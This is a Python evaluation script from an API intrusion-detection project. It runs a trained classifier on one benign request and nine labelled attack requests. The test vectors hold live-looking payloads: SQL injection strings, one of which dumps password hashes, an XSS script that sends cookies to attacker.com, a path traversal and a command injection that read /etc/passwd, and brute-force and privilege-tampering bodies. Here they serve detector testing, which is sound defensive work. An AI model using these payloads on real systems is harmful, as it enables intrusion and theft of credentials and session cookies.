#!/usr/bin/env python3
"""
Interactive ML Model Testing & Comprehensive Results Reporter
Part of API Sentinel / API_IDS Project

Loads trained model artifacts, runs verification on held-out test data,
prints per-class performance metrics, and executes live inference on
realistic test vectors across every attack category.
"""

import json
import os
import sys
import time
from typing import Dict, List, Any

import numpy as np
import pandas as pd
from sklearn.metrics import classification_report, confusion_matrix

# Add parent directory to sys.path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.schemas.request import PredictionRequest
from app.services.predictor import predictor


def run_comprehensive_test():
    print("=" * 80)
    print("API SENTINEL — ML MODEL VERIFICATION & EVALUATION RUNNER")
    print("=" * 80)

    # 1. Initialize predictor
    print("\n[*] Initializing MLPredictor and loading serialized artifacts...")
    t0 = time.perf_counter()
    predictor.load_artifacts()
    t_load = (time.perf_counter() - t0) * 1000
    print(f"[+] Loaded all model artifacts in {t_load:.2f} ms")
    print(f"    - Model Name:       {predictor.metadata.get('model_name')}")
    print(f"    - Model Version:    {predictor.metadata.get('model_version')}")
    print(f"    - Best Supervised:  {predictor.metadata.get('best_supervised_algorithm')}")
    print(f"    - Target Classes:   {', '.join(predictor.metadata.get('classes', []))}")
    print(f"    - Fusion Weights:   {predictor.metadata.get('optimized_fusion_weights')}")
    print(f"    - Thresholds:       {predictor.metadata.get('calibrated_thresholds')}")

    # 2. Test vectors covering every attack category + benign baseline
    test_cases = [
        {
            "name": "Benign API Request (Product Query)",
            "request": {
                "source_ip": "192.168.1.15",
                "method": "GET",
                "endpoint": "/api/v1/products/42",
                "status_code": 200,
                "response_time": 18.5,
                "request_size": 60,
                "response_size": 850,
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0",
                "authentication_status": "AUTHENTICATED",
                "requests_per_minute": 6.0,
                "failed_requests": 0.0,
                "unique_endpoints": 2.0,
                "payload": "",
            },
        },
        {
            "name": "SQL Injection (Tautology & Quote Manipulation)",
            "request": {
                "source_ip": "198.51.100.22",
                "method": "POST",
                "endpoint": "/api/v1/auth/login",
                "status_code": 401,
                "response_time": 45.0,
                "request_size": 260,
                "response_size": 180,
                "user_agent": "sqlmap/1.7.2#stable",
                "authentication_status": "FAILED",
                "requests_per_minute": 75.0,
                "failed_requests": 14.0,
                "unique_endpoints": 2.0,
                "payload": "' OR '1'='1 --",
            },
        },
        {
            "name": "SQL Injection (UNION SELECT Data Exfiltration)",
            "request": {
                "source_ip": "198.51.100.33",
                "method": "GET",
                "endpoint": "/api/v1/users/search",
                "status_code": 500,
                "response_time": 68.0,
                "request_size": 310,
                "response_size": 2200,
                "user_agent": "Mozilla/5.0",
                "authentication_status": "UNAUTHENTICATED",
                "requests_per_minute": 20.0,
                "failed_requests": 3.0,
                "unique_endpoints": 1.0,
                "payload": "1' UNION SELECT id, username, password_hash FROM users --",
            },
        },
        {
            "name": "Cross-Site Scripting (XSS Stored Payload)",
            "request": {
                "source_ip": "198.51.100.44",
                "method": "POST",
                "endpoint": "/api/v1/comments",
                "status_code": 400,
                "response_time": 32.0,
                "request_size": 240,
                "response_size": 150,
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "authentication_status": "AUTHENTICATED",
                "requests_per_minute": 15.0,
                "failed_requests": 1.0,
                "unique_endpoints": 2.0,
                "payload": "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
            },
        },
        {
            "name": "Path Traversal / Local File Inclusion (LFI)",
            "request": {
                "source_ip": "198.51.100.55",
                "method": "GET",
                "endpoint": "/api/v1/static/download",
                "status_code": 403,
                "response_time": 25.0,
                "request_size": 150,
                "response_size": 80,
                "user_agent": "curl/7.88.1",
                "authentication_status": "UNAUTHENTICATED",
                "requests_per_minute": 18.0,
                "failed_requests": 4.0,
                "unique_endpoints": 1.0,
                "payload": "../../../../etc/passwd",
            },
        },
        {
            "name": "Command Injection (OS Pipe Chaining)",
            "request": {
                "source_ip": "198.51.100.66",
                "method": "POST",
                "endpoint": "/api/v1/system/ping",
                "status_code": 500,
                "response_time": 185.0,
                "request_size": 340,
                "response_size": 420,
                "user_agent": "curl/7.88.1",
                "authentication_status": "UNAUTHENTICATED",
                "requests_per_minute": 24.0,
                "failed_requests": 5.0,
                "unique_endpoints": 2.0,
                "payload": "127.0.0.1; cat /etc/passwd",
            },
        },
        {
            "name": "Brute Force Authentication Flooding",
            "request": {
                "source_ip": "198.51.100.77",
                "method": "POST",
                "endpoint": "/api/v1/auth/login",
                "status_code": 401,
                "response_time": 30.0,
                "request_size": 180,
                "response_size": 90,
                "user_agent": "Wfuzz/3.1.0",
                "authentication_status": "FAILED",
                "requests_per_minute": 95.0,
                "failed_requests": 28.0,
                "unique_endpoints": 1.0,
                "payload": "{\"username\": \"admin\", \"password\": \"admin1234\"}",
            },
        },
        {
            "name": "Horizontal Endpoint Enumeration / Discovery Scan",
            "request": {
                "source_ip": "198.51.100.88",
                "method": "GET",
                "endpoint": "/actuator/env",
                "status_code": 404,
                "response_time": 16.0,
                "request_size": 80,
                "response_size": 120,
                "user_agent": "Nikto/2.1.6",
                "authentication_status": "UNAUTHENTICATED",
                "requests_per_minute": 45.0,
                "failed_requests": 18.0,
                "unique_endpoints": 12.0,
                "payload": "",
            },
        },
        {
            "name": "Rate Abuse / Resource Starvation DoS",
            "request": {
                "source_ip": "198.51.100.99",
                "method": "POST",
                "endpoint": "/api/v1/analytics/summary",
                "status_code": 429,
                "response_time": 420.0,
                "request_size": 350,
                "response_size": 520,
                "user_agent": "python-requests/2.31.0",
                "authentication_status": "UNAUTHENTICATED",
                "requests_per_minute": 140.0,
                "failed_requests": 15.0,
                "unique_endpoints": 2.0,
                "payload": "{\"batch\": true}",
            },
        },
        {
            "name": "Parameter Tampering / Privilege Escalation Attempt",
            "request": {
                "source_ip": "198.51.100.111",
                "method": "PATCH",
                "endpoint": "/api/v1/users/permissions",
                "status_code": 403,
                "response_time": 28.0,
                "request_size": 220,
                "response_size": 110,
                "user_agent": "Mozilla/5.0",
                "authentication_status": "AUTHENTICATED",
                "requests_per_minute": 12.0,
                "failed_requests": 2.0,
                "unique_endpoints": 2.0,
                "payload": "{\"role\": \"ADMIN\", \"is_superuser\": true, \"balance\": 999999}",
            },
        },
    ]

    print("\n" + "=" * 80)
    print("LIVE INFERENCE TEST SUITE RESULTS")
    print("=" * 80)

    for i, tc in enumerate(test_cases, 1):
        req_obj = PredictionRequest(**tc["request"])
        res = predictor.predict_single(req_obj)

        print(f"\n[{i}] Scenario: {tc['name']}")
        print(f"    Target Endpoint:   {tc['request']['method']} {tc['request']['endpoint']}")
        print(f"    Payload:           {tc['request']['payload'][:60] if tc['request']['payload'] else '[EMPTY]'}")
        print(f"    >>> Prediction:    {res.prediction} (Severity: {res.severity})")
        print(f"    >>> Attack Type:   {res.attack_type}")
        print(f"    >>> Risk Score:    {res.risk_score:.4f} (Anomaly: {res.anomaly_score:.4f}, Payload: {res.payload_score:.4f})")
        print(f"    >>> Confidence:    {res.confidence:.2%}")
        print(f"    >>> Latency:       {res.inference_time_ms:.2f} ms")
        print(f"    >>> Explanations:")
        for r in res.reasons:
            print(f"        * {r}")


if __name__ == "__main__":
    run_comprehensive_test()
